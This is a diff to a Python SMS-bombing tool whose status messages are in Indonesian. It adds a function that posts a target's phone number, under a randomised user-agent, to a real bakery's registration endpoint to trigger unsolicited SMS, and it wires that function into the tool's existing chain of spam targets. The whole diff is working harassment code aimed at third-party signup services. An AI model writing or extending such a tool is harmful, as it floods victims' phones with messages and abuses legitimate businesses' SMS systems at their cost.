@@ -48,6 +48,8 @@ class main:
       loding()
       spam.prosehat(nom)
       loding()
+      spam.theharvest(nom)
+      loding()
       print (f"{ken}[{kun}•{ken}] {kan}Proses selesai")
   except ru.ConnectionError:print (f"{ken}[{kun}•{ken}]{kan} Koneksi Error")
   except KeyboardInterrupt:print (f"{ken}[{kun}•{ken}]{kun} Program dihentikan")
@@ -360,6 +362,19 @@ class spam:
       print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({kun}SMS{kan}) {ken}Prosehat{kan} OK")
      else:
       print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({kun}SMS{kan}) {ken}Prosehat{kun} Gagal")
+ def theharvest(nom):
+     hd = {
+     'user-agent':ua.random
+     }
+     dat = {
+     'phone':nom
+     }
+     r = ru.Session()
+     hyu = r.post("https://harvestcakes.com/register",headers=hd,data=dat)
+     if 'function' in hyu.text:
+      print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({kun}SMS{kan}) {ken}TheHarvest{kan} OK")
+     else:
+      print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({kun}SMS{kan}) {ken}TheHarvest{kun} Gagal")
 try:
  os.system("clear")
  bnr()
